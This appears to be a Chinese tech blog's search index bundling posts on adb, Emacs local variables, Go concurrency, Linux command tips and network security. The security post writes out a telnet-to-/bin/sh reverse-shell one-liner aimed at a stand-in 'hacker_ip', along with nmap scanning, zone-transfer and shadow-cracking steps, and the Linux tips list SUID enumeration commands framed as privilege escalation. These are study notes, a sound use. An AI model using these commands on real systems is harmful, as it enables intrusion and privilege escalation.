viewTree Android Studio：Android Device Monitor UIAutomatorViewer Appium Inspector Espresso adb flipper：A desktop debugging platform for mobile developers.\nadb 命令备忘 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 查看当前 Activity 是否使用了 SurfaceView。如果有 SurfaceView 字样，则表示使用了 SurfaceView adb shell dumpsys SurfaceFlinger|grep 'HWC layers' -A10 # 查看最近的 crash 日志 adb logcat -b crash # 查看当前 Activity adb shell dumpsys activity top | grep ACTIVITY # 查看当前获得焦点的 Window 所在的 Activity adb shell dumpsys window | grep mCurrentFocus # 通过 Action 隐式拉起页面，例如通过 schema 拉起页面 adb shell am start -a android.intent.action.VIEW -d 'kwai://live/play/RZA8aukYCco' # 通过 包名/组件名 显示拉起页面 adb shell am start -n com.android.camera/com.android.camera.Camera adb shell am start -n com.android.browser/com.android.browser.BrowserActivity ","description":"\n","tags":["tools","android"],"title":"\nAndroid Tools","uri":"/posts/android-tools/"},{"categories":null,"content":"Emacs 中的变量 要解释本地变量，先解释一下 Emacs 里面变量的作用。\nEmacs 中有很多功能（内置的或者插件提供的）都可以通过设置一些变量的值来 进行一些个性化的定制。\n这里举几个例子加以说明：\nindent-tabs-mode 是否使用 tab来做缩进 fill-column 设置自动换行的长度，默认 70 org-download-image-dir 设置 org-download 插件用来存储图片的路径， 默认为文档所在目录 org-confirm-babel-evaluate 设置 babel 执行代码时是否需要确认 一般情况下，我们可以通过在 .emacs 文件中对这些变量进行全局配置。但如 果你有进一步的诉求，例如希望针对某个项目（或者某个目录）有一些不同的定 制，或者甚至对某个文件进行单独的配置呢？\n这时候 Local Variables 就派上用场了。\n简单来说，你可以有两个选择：\ndirectory-local variables 在目录中创建一个叫 .dir-locals.el 的文件，该目录下（以及子目录下） 的所有文件都会应用该文件的配置。出于性能考虑，远程文件默认不开启父目 录搜索功能。 file-local variables 可以在文件的第一行，或者文件末尾处定义，仅对该文件有效，具体如何定义 后文有介绍。针对同一个变量，file-local 会覆盖 directory-local 的定义。 directory-local variables 本地目录变量 除了 .dir-locals.el 文件，还可以定义额外的 .dir-locals-2.el 文件。 当 .dir-locals.el 文件在 git 仓库中作为共享文件时，可以通过这第二个 文件来进行一些本地化配置。\n.dir-locals.el 文件示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ( ;; 这些配置会应用到任意模式（即所有文件） (nil . ((indent-tabs-mode . t) (fill-column . 80) (mode . auto-fill))) ;; 这些配置只会应用到 c-mode 的文件中 (c-mode . ((c-file-style . \"BSD\") ;; 下面这句指定该配置仅应用到当前目录，不应用到子目录 (subdirs . nil))) ;; 这些配置只会应用到 org 文件中 (org-mode . ((org-download-image-dir . \"./images\"))) ;; 这些配置会应用到 src/imported 目录下的所有文件中 (\"src/imported\" . ((nil . ((change-log-default-name . \"ChangeLog.local\")))))) 另一种配置 directory-local variables 的方式，是定义一个 directory class, 然后指定某个目录使用该 directory class 。举例说明：\n1 2 3 4 5 (dir-locals-set-class-variables 'unwritable-directory '((nil . ((some-useful-setting . value))))) (dir-locals-set-directory-class \"/usr/include/\" 'unwritable-directory) 如果你不能直接在目录下创建 .dir-locals.el 文件的话，上面这种方式就很 有用。\nfile-local variables 本地文件变量 可以在文件的第一行定义，可以以注释的形式出现，例如 elisp 文件可以这么 定义：\n1 ;; -*- mode: Lisp; fill-column: 75; comment-column: 50; -*- org 文件指定 org-download 的图片保存路径：\n1 # -*- mode: Org; org-download-image-dir: \"./images\"; -*- 其中 mode 变量比较特殊，是用来指定 major mode 的，类似的特殊变量还有 eval, coding 等，后文有介绍。\n如果是 shell 脚本，由于第一行用于指定脚本解释器，因此可以写在第二行。\n如果不想手写，可以通过如下几个命令来自动编辑：\nadd-file-local-variable-prop-line 增加变量定义 delete-file-local-variable-prop-line 删除变量定义 copy-dir-locals-to-file-locals-prop-line 拷贝 directory-local variables 到第一行 另一种方式，是在文件的末尾附近（离末尾不超过3000行）定义 local variables list:\n1 2 3 4 /* Local Variables: */ /* mode: c */ /* comment-column: 0 */ /* End: */ 如果你在文件中有类似的文本，但是不希望被当作 local variables list，可 以通过插入一个换页符（^L, 参考Pages）来撤销该功能，因为 Emacs 只会在最 后一页查找 local variables list。\n一些特殊变量 mode 指定 major mode eval 运行 lisp 表达式，返回值会被忽略 coding 指定文档的编码系统，详情参考 Coding Systems unibyte 是否采样 unibyte mode 加载或者编译 Emacs Lisp 文件，参考 Disabling Multibyte Characters 注意，请不要使用 mode 变量来指定 minor mode, 而应该使用 eval 运行 lisp 代码来启用或关闭 minor mode。例如下面的例子，会打开 eldoc-mode, 并关闭 font-lock-mode：\n1 2 3 4 ;; Local Variables: ;; eval: (eldoc-mode) ;; eval: (font-lock-mode -1) ;; End: 最后，如果你通过命令做了一些乱七八糟的配置，想复原的话，可以通过 M-x normal-mode 命令来根据文件名，以及文件内容，重置本地变量和 major mode 设置。\n安全性问题 由于加载本地变量存在一定的安全隐患，所以除非是一些 Emacs 认为是安全的 变量，否则 Emacs 将向你确认是否执行。\n当然，你可以通过一些配置来指定你认为是安全的变量或者命令，详情请参考 Safe-File-Variables 。\n","description":"\n","tags":["emacs","elisp","tools"],"title":"\nEmacs 的本地变量 (Local Variables)","uri":"/posts/emacs-local-variables/"},{"categories":null,"content":"Go 的并发哲学 Don’t Communicate by sharing memory, share memory by communicating.\n不要通过共享内存来通信；相反，通过通信来共享内存。\nGenerator 发生器 Generator 指返回一个 chan 的函数。这是一种十分常见的使用 goroutine + chan 的方式，可以说是一种标准用法了。\n采用这种方式使用 chan 十分的安全，不会出现一些 chan 误用导致的错误（例如向已经关闭的 chan 写入数据等）。\n例如下面的代码，会开一个 goroutine 递归遍历指定目录，并将目录下的所有 json 文件通过 chan 吐出去。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func walkJsonFiles(dir string) \u003c-chan string { out := make(chan string) go func() { defer close(out) err := filepath.WalkDir(dir, func(path string, info fs.DirEntry, err error) error { if err != nil { log.Printf(\"can't access path: %q: %v\\n\", path, err) return err } if !info.Type().IsDir() \u0026\u0026 filepath.Ext(path) == \".json\" { out \u003c- path } return nil }) if err != nil { log.Printf(\"error walking the path %q: %v\\n\", dir, err) return } }() return out } Multiplexing 多路复用（Fan-In） 下面这张图可以形象的表达 Fan-In 的概念：\nFan-In: 多 goroutine 版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 func fanIn(cs ...\u003c-chan string) \u003c-chan string { out := make(chan string) var wg sync.WaitGroup // 注意：这里不能直接 wg.Wait()，需要开一个 goroutine 来 Wait defer func() { go func() { wg.Wait() close(out) }() }() collect := func(in \u003c-chan string) { defer wg.Done() for n := range in { out \u003c- n } } wg.Add(len(cs)) // Fan-In for _, c := range cs { go collect(c) } return out } Fan-In: select 版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func fanInUsingSelect(input1, input2 \u003c-chan string) \u003c-chan string { out := make(chan string) go func() { defer close(out) for { select { case x, ok := \u003c-input1: if !ok { input1 = nil } else { out \u003c- x } case x, ok := \u003c-input2: if !ok { input2 = nil } else { out \u003c- x } } if input1 == nil \u0026\u0026 input2 == nil { break } } }() return out } Fan-Out Fan-Out 刚好和 Fan-In 相反，一般和 Fan-In 配合起来一起使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 func processJsonFiles(ch \u003c-chan string) \u003c-chan string { out := make(chan string) go func() { defer close(out) for s := range ch { // do something useful ... out \u003c- s + \" done\" } }() return out } func fanOut(in \u003c-chan string) \u003c-chan string { // 同时开 n 个 goroutine 来处理这些 json files n := 20 cs := make([]\u003c-chan string, n) for i := 0; i \u003c n; i++ { cs[i] = processJsonFiles(in) } out := fanIn(cs...) return out } func main() { ch := walkJsonFiles(\"./\") out := fanOut(ch) for s := range out { fmt.Println(s) } } select 实现 Timeout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package main import ( \"fmt\" \"time\" ) // 为每次 select 设置超时 // 每次 select 都会重置超时 func selectTimeout(in \u003c-chan string) { for { select { case s := \u003c-in: fmt.Println(\"tick\", s) case \u003c- time.After(1 * time.Second): fmt.Println(\"You're too slow.\") return } } } // 为整个 for 循环设置一个超时，时间结束即退出 func selectTimeout2(in \u003c-chan string) { timeout := time.After(1 * time.Second) for { select { case s := \u003c-in: fmt.Println(\"tock\", s) case \u003c- timeout: fmt.Println(\"timed out\") return } } } func main() { in := make(chan string) go func() { for i := 0; i \u003c 20; i++ { time.Sleep(time.Duration(i * 200) * time.Millisecond) in \u003c- fmt.Sprintf(\"%d\", i) } }() go selectTimeout2(in) selectTimeout(in) } 输出如下：\n1 2 3 4 5 6 7 tick 0 tock 1 tick 2 timed out tick 3 tick 4 You're too slow. 优雅的退出 (quit chan) 由于 chan 可以进行双向通信（round-trip communication），因此，可以很方便的实现退出前的清理工作。\n例如：\nA 通知 B 退出 B 收到退出指令时，执行清理动作，完成后再通知 A A 收到通知后，结束完整的退出流程 代码示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import ( \"fmt\" \"io/fs\" \"path/filepath\" \"errors\" ) func walkAndGracefulQuit(dir string, quit chan string) (\u003c-chan string, \u003c-chan bool) { out := make(chan string) done := make(chan bool) go func() { defer func() { close(out) cleanup() done \u003c- true }() filepath.WalkDir(dir, func(path string, info fs.DirEntry, err error) error { if err != nil { fmt.Printf(\"can't access path: %q %v\\n\", path, err) return err } if !info.Type().IsDir() \u0026\u0026 filepath.Ext(path) == \".md\" { select { case out \u003c- path: // do nothing case \u003c-quit: return errors.New(\"quit\") } } return nil }) }() return out, done } func cleanup() { } func main() { quit := make(chan string) c, done := walkAndGracefulQuit(\".\", quit) i := 0 for name := range c { fmt.Println(name) // 找到第一个文件后，立即退出 if i++; i == 1 { // 这里要用 goroutine 在后台发射退出信号，以防止目录下只有一个 md 文 // 件时，由于没有机会读 quit chan 而出现死锁现象。另一种做法是，利用 // select 来发射，但没有用 goroutine 这么简单和稳妥。 go func() { quit \u003c- \"bye\" }() } } // 等待清理动作完毕，正式结束程序 \u003c-done } 案例学习：Google Search Go talks 有一个很经典的案例，这里我们学习一下。\n假设 Google Search 有三个后端搜索服务：\nWeb Search Image Search Video Search 这三个分别负责搜索网页，图片和视频。现在要整合这三个服务，对用户提供完整的搜索服务。\nSearch 1.0 最简单形态，轮流访问后端服务，无并发实现：\n1 2 3 4 5 6 func Google(query string) (results []Result) { results = append(results, Web(query)) results = append(results, Image(query)) results = append(results, Video(query)) return } Search 2.0 无需锁、条件变量、回调，即可实现并发搜索：\n1 2 3 4 5 6 7 8 9 10 11 12 func Google(query string) (results []Result) { c := make(chan Result) go func() { c \u003c- Web(query) } () go func() { c \u003c- Image(query) } () go func() {c \u003c- Video(query) } () for i := 0; i \u003c 3; i++ { result := \u003c-c results = append(results, result) } return } Search 2.1 设置搜索服务的超时时间，避免被后端较慢的（或者出故障的）服务拖垮：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func Google(query string) (results []Result) { c := make(chan Result) go func(){ c \u003c- Web(query) }() go func(){ c \u003c- Image(query) }() go func(){ c \u003c- Video(query) }() timeout := time.After(80 * time.Millisecond) for i := 0; i \u003c 3; i++ { select { case result := \u003c-c: results = append(results, result) case \u003c-timeout: fmt.Println(\"timed out\") return } } } Search 3.0 通过后端服务多开（replicated），降低尾部延迟（tail latency）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 func First(query string, replicas ...Search) Result { c := make(chan Result) searchReplica := func(i int) { c \u003c- replicas[i](query) } for i := range replicas { go searchReplica(i) } return \u003c-c } func Google(query string) (results []Result) { c := make(chan Result) go func() { c \u003c- First(query, Web1, Web2) } () go func() { c \u003c- First(query, Image1, Image2) } () go func() { c \u003c- First(query, Video1, Video2) } () timeout := time.After(80 * time.Millisecond) for i := 0; i \u003c 3; i++ { select { case result := \u003c-c: results = append(results, result) case \u003c-timeout: fmt.Println(\"timed out\") return } } return } 参考资料 Go Concurrency Patterns - slide Go Concurrency Patterns - source code of slide ","description":"\n","tags":["golang","concurrency"],"title":"\nGo 并发模式总结","uri":"/posts/go-concurrency-patterns/"},{"categories":null,"content":"VSCode 有一个比较方便的快捷键：Ctrl-` ，可以一键拉起 terminal 。\n这里在 Emacs 中模拟一下这个功能，而且还是增强版本，可以在不同文件中拉 起不同的 terminal，拉起的 terminal 路径和当前文件的目录一致。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ;; emacs 自带的 term 命令只支持单个 terminal，因此该功能依赖 ;; multi-term 。这里先检查有没有安装，没有的话先安装 multi-term (unless (package-installed-p 'multi-term) (package-install 'multi-term)) ;; 定义拉起 multi-term 的函数，如果当前目录已经拉起过 terminal，则直接 ;; 跳转到该 terminal。由于我的屏幕比较宽，这里会自动将 terminal 分屏到 ;; 右侧 (defun open-or-jump-to-multi-term () (interactive) (if (string-prefix-p \"*terminal\u003c\" (buffer-name)) (delete-window) (progn (setq bufname (concat \"*terminal\u003c\" (directory-file-name (file-name-directory (buffer-file-name))) \"\u003e\")) (if (get-buffer-process bufname) (switch-to-buffer-other-window bufname) (progn (split-window-right) (other-window 1) (multi-term) (rename-buffer bufname) ) ))) ) ;; 定义快捷键，和 VSCode 一致 (global-set-key (kbd \"C-`\") 'open-or-jump-to-multi-term) Emacs 最大的魅力，也许就是可以按照自己的喜好，随心定制各种功能吧！另外 各种文本编辑的快捷键，也是越用越顺手。\n","description":"\n","tags":["emacs","elisp","terminal","vscode","tools"],"title":"\n在 Emacs 中实现 VSCode 的 terminal 快捷键功能","uri":"/posts/emacs-vscode-terminal/"},{"categories":null,"content":"记录一些常用的命令行工具，方便随时取用。\ngit throught ssh 1 git remote add origin ssh://user@my.git.svr/path/to/repo 通过 crontab 实现开机自启动 # 每次系统重启时，都会运行 ss.sh @reboot ss.sh xxd 十六进制（二进制） dump xxd 以十六进制形式 dump 文件内容 xxd -b 以二进制形式 dump 文件内容 xxd -r 从 dump 内容还原出原始文件，例如 xxd file | xxd -r 和 cat file 的输出是一致的 uniq 过滤、报告相同行 uniq 相同行仅打印一次 uniq -c 行首插入该行重复出现的次数 uniq -d 仅输出相同行 uniq -u 仅输出不同行 查看网络端口监听情况 1 netstat -tunlp 查看 CPU 总核心数 1 grep -c 'model name' /proc/cpuinfo find printable strings 查找二进制文件中的字符串 例如查看 /bin 目录下的程序可能会创建哪些临时文件:\n1 strings /bin/* | grep tmp 查看、配置资源限制 1 ulimit -a 1 2 3 4 5 6 7 8 9 10 11 core file size (blocks, -c) 0 data seg size (kbytes, -d) unlimited file size (blocks, -f) unlimited max locked memory (kbytes, -l) unlimited max memory size (kbytes, -m) unlimited open files (-n) 1024 pipe size (512 bytes, -p) 1 stack size (kbytes, -s) 9788 cpu time (seconds, -t) unlimited max user processes (-u) 2784 virtual memory (kbytes, -v) unlimited 测试硬盘速度 1 2 3 4 5 # bs 默认为 512 字节，单位支持 k/m （macOS 平台如此，Linux 上不一样） # write dd of=${path_on_disk} if=/dev/zero bs=1m count=1000 # read dd if=${path_on_disk} of=/dev/null bs=1m 1 2 3 4 5 6 1000+0 records in 1000+0 records out 1048576000 bytes transferred in 0.619836 secs (1691698844 bytes/sec) 1000+0 records in 1000+0 records out 1048576000 bytes transferred in 0.246972 secs (4245726816 bytes/sec) 监控磁盘 IO 情况 1 iostat 1 2 3 disk0 disk2 disk3 cpu load average KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56 下载脚本并立即执行 以下命令会自动安装 yarn 包管理工具：\n1 curl --compressed -o- -L https://yarnpkg.com/install.sh | bash 参数解释：\n–compressed 请求压缩方式传输，节省流量、提高速度 -o- -o 指定保存的文件路径，参数指定为 - 则强制输出到 stdout -L 跟随重定向 ","description":"\n","tags":["tools","command","scripts","linux","macos"],"title":"\n常用命令行工具","uri":"/posts/cmd-line-tools/"},{"categories":null,"content":"踩点 DNS zone transfer 区域传送 https://digi.ninja/projects/zonetransferme.php\nhttps://www.mi1k7ea.com/2021/04/03/浅析DNS域传送漏洞/\n1 dig axfr @nsztm1.digi.ninja zonetransfer.me 网络拓扑 1 2 3 4 5 6 7 8 traceroute # -I: ICMP, -U: UDP, -T: TCP traceroute -I # tells the network to route the packet through the specified gateway # (most routers have disabled source routing for security reasons). traceroute -g 10.10.10.5 ping 一般默认走 ICMP 协议。\nICMP（Internet Control Message Protocol，互联网控制协议）是网络层协议，但是它不像 IP 协议和 ARP 协议一样直接传递给数据链路层，而是先封装成 IP 数据包然后再传递给数据链路层。所以在 IP 数据包中如果协议类型字段的值是 1 的话，就表示 IP 数据是 ICMP 报文。IP 数据包就是靠这个协议类型字段来区分不同的数据包的。\n在 IP 通信中如果某个包因为未知原因没有到达目的地址，那么这个具体的原因就是由 ICMP 负责告知。而 ICMP 协议的类型定义中就清楚的描述了各种报文的含义。\n扫描 1 2 3 4 sudo arp-scan 172.19.50.0/24 # 端口扫描，-Pn 忽略主机发现，避免 ICMP 被屏蔽 nmap -Pn 172.19.50.218 协议栈指纹分析技术 协议栈指纹分析技术：Stack Fingerprinting，分主动式、被动式。\n通过检查协议栈具体实现的细微差异，侦测目标设备的操作系统。\n1 2 # 扫描 OS，主动式 sudo nmap -O -Pn 192.168.1.1 查点 服务指纹分析技术 1 2 # 检查某个服务的版本号 nmap -sV 192.168.1.1 -p 22 漏洞扫描器 Nessus nmap script engine 标语抓取技术 连接到远程应用程序，并观察其输出。\n1 2 3 4 telnet www.example.com 80 # netcat, TCP/IP 瑞士军刀 nc -v www.example.com 80 攻击 Unix 远程访问 缓冲区溢出攻击 堆栈缓冲区溢出 heap 缓冲区溢出 反向通道 在自己的机器上打开 nc 监听器，接受反向的 telnet 连接； 在目标机器上执行 telnet 命令，建立反向通道。 Example 1：\n1 2 3 4 5 6 7 8 # 自己的机器，这个终端接受 sh 命令输入 nc -l -n -v -p 80 # 自己的机器，这个终端会打印 sh 标准输出 nc -l -n -v -p 25 # 目标机器 /bin/telnet hacker_ip 80 | /bin/sh | /bin/telnet hacker_ip 25 Security Tips\nchmod 750 telnet 禁止不必要执行 telnet 的用户去执行它。\n本地访问 离线口令破解 获取 /etc/shadow 文件\nMCF 格式：$算法$salt$hash ，算法1：MD5，算法2：Blowfish 计算 hash(salt+password) ，和 shadow 文件中的值比较，匹配则破解成功\n破解程序：John the Ripper，AKA: John, JTR\n本地缓冲区溢出 一般以 SUID 属性的文件为目标，从而允许攻击者以 root 特权执行命令。\n参考：Linux Tips\nSecurity Tips\n尽量不要设置 SUID 位。\n","description":"\n","tags":["network","security","tools"],"title":"\n网络安全 Network Security","uri":"/posts/network-security/"},{"categories":null,"content":"记录一些常用的命令行工具，方便随时取用。\n包管理 Ubuntu/Debian 上查看一个包的安装了哪些文件，安装到哪里了：\n先用 dpkg -l | grep vim 找到要查看的包的完整包名； 再通过包名查看安装的文件： dpkg -L neovim 小技巧 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 更好的 export 环境变量的方法，避免将敏感信息暴露在命令行历史记录中 export XXX_KEY=$(cat) # macOS 访问剪贴板，将文本写入剪贴板 echo hello | pbcopy # macOS 读取剪贴板 pbpaste # 生成一个 32 字节的 url safe 的 secret key python3 -c 'import secrets; print(secrets.token_urlsafe(32))' # 生成一个 32 字节的 hex secret key python3 -c 'import secrets; print(secrets.token_hex(32))' Filesystem losetup 1 2 3 4 5 6 7 8 # bind the file test.img to loop device /dev/loop0 losetup /dev/loop0 test.img mkfs.ext4 /dev/loop0 mount -o discard /dev/loop0 /mnt # list all loop devices losetup -la Network Network Tools 网络工具箱 。\nfd 1 2 3 4 # 查找多种扩展名 fd '.(java|kt)' fd '.(java|kt)' | xargs rg -U '\\bLiveStream\\s*\\(' -l rg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -l，仅打印匹配的文件名，忽略匹配到的内容 rg -l LiveStream # -v，反向匹配（过滤掉匹配到的） rg -l LiveStream | rg -v getLiveStream # '\\b', 匹配 word 边界 rg -l '\\bLiveStream\\(' # '\\s', 匹配空白字符 rg '\\bLiveStream\\s*\\(' # -U, 匹配多行文本 rg -U '\\bLiveStream\\s*\\(' xargs xargs on Mac OS：\n1 2 find . -iname something | xargs -I {} mv {} /dest/path find /tmp/ -ctime -1 -name \"x*\" | xargs -I '{}' mv '{}' ~/play/ Crontab 1 2 3 4 5 # 每 10 分钟运行一次 */10 * * * * command # 开机自启动：每次系统重启时，都会运行 ss.sh @reboot ss.sh 参考：https://crontab.guru/every-10-minutes\n二进制工具 二进制 dump 工具\nxxd 以十六进制形式 dump 文件内容 xxd -b 以二进制形式 dump 文件内容 xxd -r 从 dump 内容还原出原始文件，例如 xxd file | xxd -r 和 cat file 的输出是一致的 查找二进制文件中的字符串（find printable strings），例如：\n1 2 # 查看 /bin 目录下的程序可能会创建哪些临时文件 strings /bin/* | grep tmp 代理相关 如果你的 http_proxy 需要登录，可以设置如下：\nexport http_proxy=http://username:password@host:port\n过滤、报告相同行 uniq\n相同行仅打印一次\nuniq -c 行首插入该行重复出现的次数\nuniq -d 仅输出相同行\nuniq -u 仅输出不同行\n系统管理相关 用户管理 usermod -a -G sudo user1 将 user1 增加到 sudo 组\nsu - user\n当你使用带有破折号的 su - user1 命令时，系统会执行以下操作：\n切换到 user1 账户。 重新初始化环境变量，包括 PATH、HOME、SHELL 等，使其与 user1 的默认设置一致。这些设置通常在 /etc/passwd 文件和 user1 的配置文件（如 .bashrc、.bash_profile 等）中定义。 将工作目录切换到 user1 的主目录。 如果定义了登录脚本（如 .bash_profile 或 .profile），则执行这些脚本。 使用不带破折号的 su user1 命令时，只会切换到 user1 账户，但不会重置环境变量或更改工作目录。这意味着，即使你已经切换到了另一个用户，当前环境仍然保留了原始用户的设置。\n总之，使用带有破折号的 su - user1 命令可以更好地模拟一个完整的登录环境，而不仅仅是切换用户。在需要以另一个用户的完整环境执行任务时，建议使用带破折号的 su - 命令。\nscript /dev/null 该命令可以解决 su 切换用户后，运行 screen 程序时报错：\n1 Cannot open your terminal '/dev/pts/0' - please check. 的问题。\n原理是 script 命令会开启一个新的伪终端（pseudo-terminal），用来 dump 终端上的所有输出。\n1 2 3 4 5 # 查看 CPU 总核心数 grep -c 'model name' /proc/cpuinfo # 查看、配置资源限制 ulimit -a 测试硬盘速度 1 2 3 4 5 # bs 默认为 512 字节，单位支持 k/m （macOS 平台如此，Linux 上不一样） # write dd of=${path_on_disk} if=/dev/zero bs=1m count=1000 # read dd if=${path_on_disk} of=/dev/null bs=1m 监控磁盘 IO 情况 1 iostat 1 2 3 disk0 disk2 disk3 cpu load average KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56 文件权限 1 2 3 4 5 6 7 8 9 10 # 更改文件属组 chgrp [-R] group filename # 更改文件属主 chown [-R] owner filename chown [-R] owner:group filename # 更改文件属性 chmod u=rwx,g=rx,o=r test1 chmod a-x test1 SUID, SGID, sticky bit\n1 2 3 4 5 6 7 8 9 10 11 # 为程序设置 SGID, 程序将以文件所属组的权限运行 chmod g+s executable # 为程序设置 SUID, 程序将以文件属主的权限运行 chmod u+s executable # 为目录设置 SGID, 该目录下新建的文件或目录的组将默认为该目录的组 chmod g+s directory # 设置 sticky bit, 该目录下新建的文件或目录不能被非owner删除（该目录的属主是个例外，可以删除任意文件） chmod +t directory SUID/SGID 提权\nSUID (Set UID)是Linux中的一种特殊权限，其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.\n在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.\n1 2 3 4 5 # 设置SUID位 chmod u+s filename # 去掉SUID设置 chmod u-s filename 以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。\n1 2 3 4 5 6 7 8 9 10 # 列出所有 SUID 文件 find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; # 列出所有 SGID 文件 find / -type f -perm -04000 -ls # 列出所有全局可写文件 find / -perm -2 -type f -print 文件时间戳 atime\nAccess Time\n出于性能考虑，一般 mount 的时候会增加如下选项，导致 atime 表现和预期不一致：\n- ``noatime`` Do not update the file access time when reading from a file - ``relatime`` Update inode access times relative to modify or change time. Access time is only updated if the previous access time was earlier than the current modify or change time. ls -lu 列出 atime， ls -ltu 按 atime 排序（最近的排最上面）\nmtime\nModify Time，最后一次修改文件（内容）或者目录（内容）的时间 ls -l ls -lt 默认使用 mtime cp 文件默认会改变 mtime + ctime cp -a 只会改变 ctime，mtime 不变 ctime\nChange Time，最后一次改变文件（属性或权限）或者目录（属性或权限）的时间 ls -lc ls -ltc 使用 ctime 1 2 3 4 5 6 7 8 9 10 stat filename # sort by mtime ls -lt # sort by ctime ls -ltc ls -alR \u003e /path/to/timestamp_modification.txt ls -alRc \u003e /path/to/timestamp_creation.txt 文件打洞 如何在一个大文件（例如 \u003e500G）的开头，高效的插入一些内容？\n如果是 Linuxe + ext4/XFS，可以考虑用 fallocate 函数，FALLOC_FL_INSERT_RANGE 标记位。\n参考：https://stackoverflow.com/questions/37882286/prepend-to-very-large-file-in-fixed-time-or-very-fast/37884191#37884191\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # 子目录按占用空间大小排序 du -d 1 |sort -n # 查看 CPU 总核心数 grep -c 'model name' /proc/cpuinfo # 在 /bin 或者 /usr/sbin 中运行，搜索哪些程序会创建临时文件 strings * | grep tmp # 查看资源限制的设置 ulimit -a # 测试硬盘速度 # bs 默认为 512 字节，单位支持 k/m （macOS 上，Linux 不一样） dd of=/Volumes/disk-1t/1.out if=/dev/zero bs=1m count=10000 dd if=/Volumes/disk-1t/1.out of=/dev/null bs=1m # 监控磁盘 io 情况，-p 指定 某个（或某些）磁盘 iostat -x 1 # 显示当前时间配置信息 timedatectl show # 将本地时间同步到 rtc 时钟，解决 Windows 10 的系统时间不对的问题（会修改配置文件/etc/adjtime） timedatectl set-local-rtc 1 # lazy umount umount -l # 下载脚本并立即执行 curl --compressed -o- -L https://yarnpkg.com/install.sh | bash # 文件恢复到某个 revision git checkout c5f567 -- file1/to/restore file2/to/restore # 文件恢复到某个 revision 之前的 1 个版本 git checkout c5f567~1 -- file1/to/restore file2/to/restore pgrep process-name pkill process-name loopback device loopback device 可以将文件作为设备来挂载，类似于虚拟机的镜像文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 创建一个稀疏文件（sparse file） dd if=/dev/zero of=1.img bs=1 count=0 seek=512M # 将 1.img 自动绑定到一个可用的 loop device # -P, --partscan：扫描分区 sudo losetup -fP 1.img # 列出当前的 loop devices losetup # 分区 sudo fdisk /dev/loop13 # 分区之后可以看到分区的设备号，例如这里为 /dev/loop13p1 # 将分区格式化为 ext4 文件系统 sudo mkfs.ext4 /dev/loop13p1 # 挂载 loop device sudo mount /dev/loop13p1 /mount/point # 删除 loopback device sudo umount /mount/point sudo losetup -d /dev/loop13p 稀疏文件（sparse file) 的特点:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ dd if=/dev/zero of=sparse_file bs=1 count=0 seek=512M 0+0 records in 0+0 records out 0 bytes copied, 0.000138743 s, 0.0 kB/s $ ls -lh sparse_file -rw-rw-r-- 1 user user 512M 2月 2 22:36 sparse_file $ du -sh sparse_file 0 sparse_file # -s：查看实际分配的尺寸 $ ls -lhs sparse_file 0 -rw-r--r-- 1 user user 512M 2月 2 22:36 sparse_file 如果将 sparse file 作为镜像文件挂载，会随着在设备中文件的写入，镜像文件的尺寸才会逐渐增大。\n常用 Console 快捷键 快捷键 动作 ctrl+l 清屏 ctrl+d 退出shell ctrl+u 清除光标之前 ctrl+k 清除光标之后 ctrl+w 清除光标之前的一个单词 ctrl+y 粘贴刚才ctrl+u/k/w的内容 ctrl+t 交换最后两个字符 esc+k 交换最后两个单词 alt+f/ctrl+b 向前/后移动一个单词 ctrl+f/ctrl+b 向前/后移动一个字符 alt+d/ctrl+d 删除光标后的一个单词/字符 ctrl-n/ctrl-p 上一个/下一个命令 ctrl-/ undo ctrl-r reverse-i-search ! history substitution !n Refer to command line n. !-n Refer to the current command line minus n. !! Refer to the previous command. This is a synonym for `!-1'. ","description":"\n","tags":["tools","linux"],"title":"\nLinux Tips","uri":"/posts/linux-tips/"}]